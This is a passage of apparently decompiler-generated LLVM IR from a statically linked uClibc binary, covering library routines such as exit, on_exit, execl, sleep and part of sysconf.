  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 9, 6, 7, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 -87, { 1, 0 }
  uselistorder i32 -17, { 12, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 1 }
  uselistorder i8 43, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053987, { 1, 0 }
  uselistorder label %dec_label_pc_805397f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805395b, { 1, 0 }
  uselistorder label %dec_label_pc_8053918, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053902, { 1, 0 }
  uselistorder label %dec_label_pc_80538e3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80538d9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80538b5, { 1, 0 }
  uselistorder label %dec_label_pc_80538b4, { 1, 0 }
  uselistorder label %dec_label_pc_8053895, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_80539a7 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80539a7, i32* @ebx, align 4
  %v4_80539ac = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134540701, i32 ptrtoint (i32* @global_var_8062a00.265 to i32))
  %v1_80539b8 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062a00.265 to i32))
  %v0_80539bd = load i32, i32* @global_var_80672a4.266, align 4
  %v1_80539c5 = icmp eq i32 %v0_80539bd, 0
  br i1 %v1_80539c5, label %dec_label_pc_80539d2, label %dec_label_pc_80539c9

dec_label_pc_80539c9:                             ; preds = %entry
  %v0_80539cc = load i32, i32* @esi, align 4
  %v1_80539cd = call i32 @unknown_0(i32 %v0_80539cc)
  br label %dec_label_pc_80539d2

dec_label_pc_80539d2:                             ; preds = %entry, %dec_label_pc_80539c9
  %v3_80539d7 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  %v0_80539dc = call i32 @__GI___uClibc_fini()
  %v0_80539ed = call i32 @_stdio_term()
  %v0_80539f5 = load i32, i32* @esi, align 4
  %v1_80539f6 = call i32 @__GI__exit(i32 %v0_80539f5)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 2, 6, 1, 3, 0, 7, 5, 4 }
  uselistorder label %dec_label_pc_80539d2, { 1, 0 }
}

define i32 @on_exit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_80539ff = call i32 @__new_exitfn()
  store i32 -1, i32* %eax.global-to-local, align 4
  %v1_8053a09 = icmp eq i32 %v0_80539ff, 0
  br i1 %v1_8053a09, label %dec_label_pc_8053a23, label %dec_label_pc_8053a0d

dec_label_pc_8053a0d:                             ; preds = %entry
  %v2_8053a11 = add i32 %v0_80539ff, 4
  %v3_8053a11 = inttoptr i32 %v2_8053a11 to i32*
  store i32 %arg1, i32* %v3_8053a11, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v1_8053a18 = inttoptr i32 %v0_80539ff to i32*
  store i32 2, i32* %v1_8053a18, align 4
  %v0_8053a1e = load i32, i32* %eax.global-to-local, align 4
  %v2_8053a1e = add i32 %v0_80539ff, 8
  %v3_8053a1e = inttoptr i32 %v2_8053a1e to i32*
  store i32 %v0_8053a1e, i32* %v3_8053a1e, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053a23

dec_label_pc_8053a23:                             ; preds = %entry, %dec_label_pc_8053a0d
  %v0_8053a26 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_8053a0d ]
  ret i32 %v0_8053a26

; uselistorder directives
  uselistorder i32 %v0_80539ff, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8053a23, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8053a2c = load i32, i32* @ebx, align 4
  store i32 %v0_8053a2c, i32* %stack_var_-12, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_8053a2f = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_8053a2f, i32* %eax.global-to-local, align 4
  %v12_8053a32 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8053a38

dec_label_pc_8053a38:                             ; preds = %dec_label_pc_8053a38, %entry
  %v0_8053a3b = phi i32 [ 0, %entry ], [ %v1_8053a3b, %dec_label_pc_8053a38 ]
  %stack_var_-16.0 = phi i32 [ %v2_8053a2f, %entry ], [ %v1_8053a3c, %dec_label_pc_8053a38 ]
  %v1_8053a3b = add i32 %v0_8053a3b, 1
  store i32 %v1_8053a3b, i32* %esi.global-to-local, align 4
  %v1_8053a3c = add i32 %stack_var_-16.0, 4
  store i32 %v1_8053a3c, i32* %eax.global-to-local, align 4
  %v1_8053a42 = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_8053a42 = load i32, i32* %v1_8053a42, align 4
  %v3_8053a42 = icmp eq i32 %v2_8053a42, 0
  %v1_8053a45 = icmp eq i1 %v3_8053a42, false
  br i1 %v1_8053a45, label %dec_label_pc_8053a38, label %dec_label_pc_8053a47

dec_label_pc_8053a47:                             ; preds = %dec_label_pc_8053a38
  %v1_8053a47 = mul i32 %v1_8053a3b, 4
  %v2_8053a47 = add i32 %v1_8053a47, 34
  %v1_8053a4e = and i32 %v2_8053a47, -16
  %v2_8053a51 = sub i32 %v12_8053a32, %v1_8053a4e
  %v1_8053a56 = add i32 %v2_8053a51, 15
  %v1_8053a5a = and i32 %v1_8053a56, -16
  store i32 %v1_8053a5a, i32* @ebx, align 4
  store i32 %v1_8053a5a, i32* %ecx.global-to-local, align 4
  %v2_8053a5f = inttoptr i32 %v1_8053a5a to i32*
  store i32 %arg2, i32* %v2_8053a5f, align 16
  store i32 %v2_8053a2f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053a67

dec_label_pc_8053a67:                             ; preds = %dec_label_pc_8053a67, %dec_label_pc_8053a47
  %stack_var_-16.1 = phi i32 [ %v2_8053a2f, %dec_label_pc_8053a47 ], [ %v1_8053a6e, %dec_label_pc_8053a67 ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_8053a6a = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053a6a = add i32 %v0_8053a6a, 4
  store i32 %v1_8053a6a, i32* %ecx.global-to-local, align 4
  %v0_8053a6d = load i32, i32* %esi.global-to-local, align 4
  %v1_8053a6d = add i32 %v0_8053a6d, -1
  %v8_8053a6d = icmp eq i32 %v1_8053a6d, 0
  store i32 %v1_8053a6d, i32* %esi.global-to-local, align 4
  %v1_8053a6e = add i32 %stack_var_-16.1, 4
  %v1_8053a74 = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_8053a74 = load i32, i32* %v1_8053a74, align 4
  store i32 %v2_8053a74, i32* %eax.global-to-local, align 4
  %v2_8053a76 = inttoptr i32 %v1_8053a6a to i32*
  store i32 %v2_8053a74, i32* %v2_8053a76, align 4
  %v1_8053a78 = icmp eq i1 %v8_8053a6d, false
  br i1 %v1_8053a78, label %dec_label_pc_8053a67, label %dec_label_pc_8053a7a

dec_label_pc_8053a7a:                             ; preds = %dec_label_pc_8053a67
  %v0_8053a7a = load i32, i32* %eax.global-to-local, align 4
  %v1_8053a7a = load i32, i32* @esp, align 4
  %v2_8053a7a = add i32 %v1_8053a7a, -4
  %v3_8053a7a = inttoptr i32 %v2_8053a7a to i32*
  store i32 %v0_8053a7a, i32* %v3_8053a7a, align 4
  %v0_8053a7b = load i32, i32* @global_var_80672b0.267, align 16
  %v2_8053a7b = add i32 %v1_8053a7a, -8
  %v3_8053a7b = inttoptr i32 %v2_8053a7b to i32*
  store i32 %v0_8053a7b, i32* %v3_8053a7b, align 4
  %v0_8053a81 = load i32, i32* @ebx, align 4
  %v2_8053a81 = add i32 %v1_8053a7a, -12
  %v3_8053a81 = inttoptr i32 %v2_8053a81 to i32*
  store i32 %v0_8053a81, i32* %v3_8053a81, align 4
  %v5_8053a82 = add i32 %v1_8053a7a, -16
  %v6_8053a82 = inttoptr i32 %v5_8053a82 to i32*
  store i32 %arg1, i32* %v6_8053a82, align 4
  %v1_8053a85 = inttoptr i32 %v1_8053a6e to i8*
  %v2_8053a85 = call i32 @__GI_execve(i8* %v1_8053a85)
  store i32 %v2_8053a85, i32* %eax.global-to-local, align 4
  %v2_8053a8d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053a8d, i32* @ebx, align 4
  ret i32 %v2_8053a85

; uselistorder directives
  uselistorder i32 %v1_8053a6d, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_8053a3c, { 1, 0 }
  uselistorder i32 %v1_8053a3b, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_8053a2f, { 0, 2, 1, 3 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-452 = alloca i32, align 4
  %stack_var_-448 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_8053a94 = load i32, i32* @ebp, align 4
  %v0_8053a95 = load i32, i32* @edi, align 4
  %v0_8053a96 = load i32, i32* @esi, align 4
  %v0_8053a97 = load i32, i32* @ebx, align 4
  %v15_8053a98 = ptrtoint i32* %stack_var_-444 to i32
  store i32 32, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v1_8053aaa = icmp eq i32 %arg1, 0
  %v1_8053aac = icmp eq i1 %v1_8053aaa, false
  br i1 %v1_8053aac, label %dec_label_pc_8053abe.preheader, label %dec_label_pc_8053c0b

dec_label_pc_8053abe.preheader:                   ; preds = %entry
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053ab3

dec_label_pc_8053ab3:                             ; preds = %dec_label_pc_8053ab3.dec_label_pc_8053ab3_crit_edge, %dec_label_pc_8053abe.preheader
  %v0_8053ab3 = phi i32 [ %v15_8053a98, %dec_label_pc_8053abe.preheader ], [ %v0_8053ab3.pre, %dec_label_pc_8053ab3.dec_label_pc_8053ab3_crit_edge ]
  %v1_8053abe29 = phi i32 [ 31, %dec_label_pc_8053abe.preheader ], [ %v1_8053abe, %dec_label_pc_8053ab3.dec_label_pc_8053ab3_crit_edge ]
  %v2_8053ab3 = mul i32 %v1_8053abe29, 4
  %v3_8053ab3 = add i32 %v2_8053ab3, 292
  %v4_8053ab3 = add i32 %v3_8053ab3, %v0_8053ab3
  %v5_8053ab3 = inttoptr i32 %v4_8053ab3 to i32*
  store i32 0, i32* %v5_8053ab3, align 4
  %v0_8053abe.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8053abe = add i32 %v0_8053abe.pre, -1
  %v9_8053abe = icmp slt i32 %v1_8053abe, 0
  store i32 %v1_8053abe, i32* %eax.global-to-local, align 4
  %v1_8053abf = icmp eq i1 %v9_8053abe, false
  br i1 %v1_8053abf, label %dec_label_pc_8053ab3.dec_label_pc_8053ab3_crit_edge, label %dec_label_pc_8053ac1

dec_label_pc_8053ab3.dec_label_pc_8053ab3_crit_edge: ; preds = %dec_label_pc_8053ab3
  %v0_8053ab3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053ab3

dec_label_pc_8053ac1:                             ; preds = %dec_label_pc_8053ab3
  store i32 %arg1, i32* %stack_var_-24, align 4
  store i32 %v1_8053abe, i32* %stack_var_-448, align 4
  store i32 %v1_8053abe, i32* %stack_var_-452, align 4
  %v2_8053ad7 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8053ad7, i32* @ebx, align 4
  store i32 %v2_8053ad7, i32* %stack_var_-460, align 4
  %v4_8053adf = call i32 @__sigaddset(i32 %v2_8053ad7, i32 17, i32 %v1_8053abe, i32 %v1_8053abe)
  store i32 %v4_8053adf, i32* %eax.global-to-local, align 4
  %v2_8053ae7 = icmp slt i32 %v4_8053adf, 0
  br i1 %v2_8053ae7, label %dec_label_pc_8053c0f, label %dec_label_pc_8053aef

dec_label_pc_8053aef:                             ; preds = %dec_label_pc_8053ac1
  store i32 %v4_8053adf, i32* %stack_var_-448, align 4
  %v2_8053af0 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_8053af0, i32* @esi, align 4
  store i32 %v2_8053af0, i32* %stack_var_-452, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_8053afb = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_8053afb = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8053afb, i32 %v2_8053af0)
  store i32 %v4_8053afb, i32* %eax.global-to-local, align 4
  %v1_8053b03 = icmp eq i32 %v4_8053afb, 0
  %v1_8053b05 = icmp eq i1 %v1_8053b03, false
  br i1 %v1_8053b05, label %dec_label_pc_8053c0f, label %dec_label_pc_8053b0b

dec_label_pc_8053b0b:                             ; preds = %dec_label_pc_8053aef
  store i32 %v4_8053afb, i32* %stack_var_-448, align 4
  store i32 %v4_8053afb, i32* %stack_var_-452, align 4
  store i32 %v2_8053af0, i32* %stack_var_-460, align 4
  %v4_8053b10 = call i32 @__sigismember(i32 %v2_8053af0, i32 17, i32 %v4_8053afb, i32 %v4_8053afb)
  store i32 %v4_8053b10, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_8053b1d = icmp eq i32 %v4_8053b10, 0
  br i1 %v1_8053b1d, label %dec_label_pc_8053b31.preheader, label %dec_label_pc_8053bd9

dec_label_pc_8053b31.preheader:                   ; preds = %dec_label_pc_8053b0b
  store i32 31, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053b26

dec_label_pc_8053b26:                             ; preds = %dec_label_pc_8053b26.dec_label_pc_8053b26_crit_edge, %dec_label_pc_8053b31.preheader
  %v0_8053b26 = phi i32 [ %v15_8053a98, %dec_label_pc_8053b31.preheader ], [ %v0_8053b26.pre, %dec_label_pc_8053b26.dec_label_pc_8053b26_crit_edge ]
  %v1_8053b3128 = phi i32 [ 31, %dec_label_pc_8053b31.preheader ], [ %v1_8053b31, %dec_label_pc_8053b26.dec_label_pc_8053b26_crit_edge ]
  %v2_8053b26 = mul i32 %v1_8053b3128, 4
  %v3_8053b26 = add i32 %v2_8053b26, 292
  %v4_8053b26 = add i32 %v3_8053b26, %v0_8053b26
  %v5_8053b26 = inttoptr i32 %v4_8053b26 to i32*
  store i32 0, i32* %v5_8053b26, align 4
  %v0_8053b31.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_8053b31 = add i32 %v0_8053b31.pre, -1
  %v9_8053b31 = icmp slt i32 %v1_8053b31, 0
  store i32 %v1_8053b31, i32* %edx.global-to-local, align 4
  %v1_8053b32 = icmp eq i1 %v9_8053b31, false
  br i1 %v1_8053b32, label %dec_label_pc_8053b26.dec_label_pc_8053b26_crit_edge, label %dec_label_pc_8053b34

dec_label_pc_8053b26.dec_label_pc_8053b26_crit_edge: ; preds = %dec_label_pc_8053b26
  %v0_8053b26.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053b26

dec_label_pc_8053b34:                             ; preds = %dec_label_pc_8053b26
  store i32 0, i32* %stack_var_-448, align 4
  store i32 0, i32* %stack_var_-452, align 4
  store i32 %v2_8053ad7, i32* %eax.global-to-local, align 4
  store i32 %v2_8053ad7, i32* %stack_var_-460, align 4
  %v4_8053b40 = call i32 @__sigaddset(i32 %v2_8053ad7, i32 17, i32 0, i32 0)
  store i32 %v4_8053b40, i32* %eax.global-to-local, align 4
  %v2_8053b48 = icmp slt i32 %v4_8053b40, 0
  br i1 %v2_8053b48, label %dec_label_pc_8053c0f, label %dec_label_pc_8053b50

dec_label_pc_8053b50:                             ; preds = %dec_label_pc_8053b34
  store i32 %v4_8053b40, i32* %stack_var_-448, align 4
  %v2_8053b51 = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_8053b51, i32* %eax.global-to-local, align 4
  store i32 %v2_8053b51, i32* %stack_var_-452, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_8053b5a = call i32 @__GI_sigaction(i32 17, i32* null, i32 %v2_8053b51)
  store i32 %v4_8053b5a, i32* %eax.global-to-local, align 4
  %v2_8053b62 = icmp slt i32 %v4_8053b5a, 0
  %v1_8053b64 = icmp eq i1 %v2_8053b62, false
  br i1 %v1_8053b64, label %dec_label_pc_8053b8e, label %dec_label_pc_8053b66

dec_label_pc_8053b66:                             ; preds = %dec_label_pc_8053b50
  %v0_8053b66 = load i32, i32* %stack_var_-460, align 4
  %v1_8053b66 = call i32 @__errno_location(i32 %v0_8053b66)
  store i32 %v1_8053b66, i32* %eax.global-to-local, align 4
  store i32 %v1_8053b66, i32* @ebx, align 4
  %v1_8053b6d = inttoptr i32 %v1_8053b66 to i32*
  %v2_8053b6d = load i32, i32* %v1_8053b6d, align 4
  store i32 %v2_8053b6d, i32* @esi, align 4
  %v0_8053b6f = load i32, i32* @ebp, align 4
  store i32 %v0_8053b6f, i32* %stack_var_-448, align 4
  store i32 0, i32* %stack_var_-452, align 4
  store i32 %v2_8053af0, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8053b7c = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8053b7c = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8053b7c, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8053b87 = load i32, i32* @esi, align 4
  %v1_8053b87 = load i32, i32* @ebx, align 4
  %v2_8053b87 = inttoptr i32 %v1_8053b87 to i32*
  store i32 %v0_8053b87, i32* %v2_8053b87, align 4
  %v0_8053c1c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053c12

dec_label_pc_8053b8e:                             ; preds = %dec_label_pc_8053b50
  %v3_8053b8e = load i32, i32* %stack_var_-420, align 4
  %v12_8053b8e = icmp eq i32 %v3_8053b8e, 1
  store i32 %v2_8053af0, i32* @ebp, align 4
  %v2_8053b9a = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053b9a, i32* @ebx, align 4
  %v1_8053ba1 = icmp eq i1 %v12_8053b8e, false
  br i1 %v1_8053ba1, label %dec_label_pc_8053bc8, label %dec_label_pc_8053ba3

dec_label_pc_8053ba3:                             ; preds = %dec_label_pc_8053b8e
  %v0_8053ba3 = load i32, i32* @edi, align 4
  store i32 %v0_8053ba3, i32* %stack_var_-448, align 4
  store i32 %v0_8053ba3, i32* %stack_var_-452, align 4
  store i32 %v2_8053b9a, i32* %stack_var_-460, align 4
  %v4_8053ba7 = call i32 @nanosleep(i32 %v2_8053b9a, i32 %v2_8053b9a, i32 %v0_8053ba3, i32 %v0_8053ba3)
  store i32 %v4_8053ba7, i32* %eax.global-to-local, align 4
  store i32 %v4_8053ba7, i32* @edi, align 4
  %v1_8053bae = call i32 @__errno_location(i32 %v2_8053b9a)
  store i32 %v1_8053bae, i32* %eax.global-to-local, align 4
  store i32 %v1_8053bae, i32* @ebx, align 4
  %v1_8053bb8 = inttoptr i32 %v1_8053bae to i32*
  %v2_8053bb8 = load i32, i32* %v1_8053bb8, align 4
  store i32 %v2_8053bb8, i32* @esi, align 4
  store i32 0, i32* %stack_var_-452, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8053bbf = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8053bbf = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8053bbf, i32 0)
  store i32 %v4_8053bbf, i32* %eax.global-to-local, align 4
  %v0_8053bc4 = load i32, i32* @esi, align 4
  %v1_8053bc4 = load i32, i32* @ebx, align 4
  %v2_8053bc4 = inttoptr i32 %v1_8053bc4 to i32*
  store i32 %v0_8053bc4, i32* %v2_8053bc4, align 4
  %v0_8053bee.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8053beb

dec_label_pc_8053bc8:                             ; preds = %dec_label_pc_8053b8e
  store i32 %v2_8053af0, i32* %stack_var_-448, align 4
  store i32 0, i32* %stack_var_-452, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8053bce = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8053bce = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8053bce, i32 0)
  store i32 %v4_8053bce, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  store i32 %v2_8053af0, i32* @ecx, align 4
  %v2_8053be4.pre = load i32, i32* %stack_var_-452, align 4
  %v3_8053be4.pre = load i32, i32* %stack_var_-448, align 4
  br label %dec_label_pc_8053be4

dec_label_pc_8053bd9:                             ; preds = %dec_label_pc_8053b0b
  store i32 %v4_8053b10, i32* %stack_var_-448, align 4
  store i32 %v4_8053b10, i32* %stack_var_-452, align 4
  %v2_8053bdb = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053bdb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053be4

dec_label_pc_8053be4:                             ; preds = %dec_label_pc_8053bc8, %dec_label_pc_8053bd9
  %storemerge3.pre-phi = phi i32 [ %v2_8053b9a, %dec_label_pc_8053bc8 ], [ %v2_8053bdb, %dec_label_pc_8053bd9 ]
  %v3_8053be4 = phi i32 [ %v3_8053be4.pre, %dec_label_pc_8053bc8 ], [ %v4_8053b10, %dec_label_pc_8053bd9 ]
  %v2_8053be4 = phi i32 [ %v2_8053be4.pre, %dec_label_pc_8053bc8 ], [ %v4_8053b10, %dec_label_pc_8053bd9 ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v4_8053be4 = call i32 @nanosleep(i32 %storemerge3.pre-phi, i32 %storemerge3.pre-phi, i32 %v2_8053be4, i32 %v3_8053be4)
  store i32 %v4_8053be4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053beb

dec_label_pc_8053beb:                             ; preds = %dec_label_pc_8053ba3, %dec_label_pc_8053be4
  %v0_8053bee = phi i32 [ %v0_8053bee.pre, %dec_label_pc_8053ba3 ], [ %v4_8053be4, %dec_label_pc_8053be4 ]
  %v1_8053bee = icmp eq i32 %v0_8053bee, 0
  br i1 %v1_8053bee, label %dec_label_pc_8053c0b, label %dec_label_pc_8053bf2

dec_label_pc_8053bf2:                             ; preds = %dec_label_pc_8053beb
  %v4_8053c02 = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_8053c02, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053c12

dec_label_pc_8053c0b:                             ; preds = %entry, %dec_label_pc_8053beb
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053c12

dec_label_pc_8053c0f:                             ; preds = %dec_label_pc_8053b34, %dec_label_pc_8053aef, %dec_label_pc_8053ac1
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053c12

dec_label_pc_8053c12:                             ; preds = %dec_label_pc_8053c0b, %dec_label_pc_8053bf2, %dec_label_pc_8053b66, %dec_label_pc_8053c0f
  %v0_8053c1c = phi i32 [ 0, %dec_label_pc_8053c0b ], [ %v4_8053c02, %dec_label_pc_8053bf2 ], [ %v0_8053c1c.pre, %dec_label_pc_8053b66 ], [ -1, %dec_label_pc_8053c0f ]
  store i32 %v0_8053a97, i32* @ebx, align 4
  store i32 %v0_8053a96, i32* @esi, align 4
  store i32 %v0_8053a95, i32* @edi, align 4
  store i32 %v0_8053a94, i32* @ebp, align 4
  ret i32 %v0_8053c1c

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 2, 0, 1 }
  uselistorder i32 %v1_8053bae, { 1, 0, 2 }
  uselistorder i32 %v2_8053b9a, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_8053b31, { 2, 1, 0 }
  uselistorder i32 %v4_8053b10, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v4_8053afb, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32 %v2_8053af0, { 0, 3, 4, 2, 6, 5, 1, 7, 8 }
  uselistorder i32 %v2_8053ad7, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_8053abe, { 0, 1, 3, 2, 6, 5, 4 }
  uselistorder i32* %stack_var_-448, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %stack_var_-452, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 0, 2, 3, 1 }
  uselistorder i32* %edx.global-to-local, { 1, 3, 2, 0, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 0, 23 }
  uselistorder i32 (i32, i32, i32, i32)* @nanosleep, { 2, 1, 3, 0 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @__GI_sigprocmask, { 10, 11, 12, 13, 14, 6, 1, 2, 4, 5, 15, 7, 8, 3, 9, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8053c12, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8053c0b, { 1, 0 }
  uselistorder label %dec_label_pc_8053beb, { 1, 0 }
  uselistorder label %dec_label_pc_8053be4, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  switch i32 %arg1, label %dec_label_pc_8053c3f [
    i32 0, label %dec_label_pc_8053c4f
    i32 1, label %dec_label_pc_8053d34
    i32 2, label %dec_label_pc_8053c59
    i32 3, label %dec_label_pc_8053c63
    i32 4, label %dec_label_pc_8053c6d
    i32 5, label %dec_label_pc_8053d03
    i32 6, label %dec_label_pc_8053c75
    i32 7, label %dec_label_pc_8053c35
    i32 8, label %dec_label_pc_8053c35
    i32 9, label %dec_label_pc_8053c35
    i32 10, label %dec_label_pc_8053c35
    i32 11, label %dec_label_pc_8053c35
    i32 12, label %dec_label_pc_8053c35
    i32 13, label %dec_label_pc_8053c35
    i32 14, label %dec_label_pc_8053c35
    i32 15, label %dec_label_pc_8053c35
    i32 16, label %dec_label_pc_8053c35
    i32 17, label %dec_label_pc_8053c35
    i32 18, label %dec_label_pc_8053c35
    i32 19, label %dec_label_pc_8053c35
    i32 20, label %dec_label_pc_8053c35
    i32 21, label %dec_label_pc_8053c35
    i32 22, label %dec_label_pc_8053c35
    i32 23, label %dec_label_pc_8053d34
    i32 24, label %dec_label_pc_8053d34
    i32 25, label %dec_label_pc_8053d40
    i32 26, label %dec_label_pc_8053d11
    i32 27, label %dec_label_pc_8053d34
    i32 28, label %dec_label_pc_8053c87
    i32 29, label %dec_label_pc_8053d0a
    i32 30, label %dec_label_pc_8053c7f
    i32 31, label %dec_label_pc_8053d1f
    i32 32, label %dec_label_pc_8053d34
    i32 33, label %dec_label_pc_8053d34
    i32 34, label %dec_label_pc_8053d34
    i32 35, label %dec_label_pc_8053d18
    i32 36, label %dec_label_pc_8053d47
    i32 37, label %dec_label_pc_8053d4e
    i32 38, label %dec_label_pc_8053d47
    i32 39, label %dec_label_pc_8053c91
    i32 40, label %dec_label_pc_8053d55
    i32 41, label %dec_label_pc_8053d34
    i32 42, label %dec_label_pc_8053d1f
    i32 43, label %dec_label_pc_8053d4e
    i32 44, label %dec_label_pc_8053d5c
    i32 45, label %dec_label_pc_8053d4e
    i32 46, label %dec_label_pc_8053d0a
    i32 47, label %dec_label_pc_8053d0a
    i32 48, label %dec_label_pc_8053d0a
    i32 49, label %dec_label_pc_8053d34
    i32 50, label %dec_label_pc_8053d34
    i32 51, label %dec_label_pc_8053d0a
    i32 52, label %dec_label_pc_8053d0a
    i32 53, label %dec_label_pc_8053d34
    i32 54, label %dec_label_pc_8053d34
    i32 55, label %dec_label_pc_8053d34
    i32 56, label %dec_label_pc_8053d34
    i32 57, label %dec_label_pc_8053d34
    i32 58, label %dec_label_pc_8053d34
    i32 59, label %dec_label_pc_8053d34
    i32 60, label %dec_label_pc_8053d34
    i32 61, label %dec_label_pc_8053d34
    i32 62, label %dec_label_pc_8053d34
    i32 63, label %dec_label_pc_8053d34
    i32 64, label %dec_label_pc_8053d34
    i32 65, label %dec_label_pc_8053d34
    i32 66, label %dec_label_pc_8053d34
    i32 67, label %dec_label_pc_8053c35
    i32 68, label %dec_label_pc_8053c35
    i32 69, label %dec_label_pc_8053d18
    i32 70, label %dec_label_pc_8053d18
    i32 71, label %dec_label_pc_8053d18
    i32 72, label %dec_label_pc_8053d1f
    i32 73, label %dec_label_pc_8053d26
    i32 74, label %dec_label_pc_8053d2d
    i32 75, label %dec_label_pc_8053c9b
    i32 76, label %dec_label_pc_8053d2d
    i32 77, label %dec_label_pc_8053c35
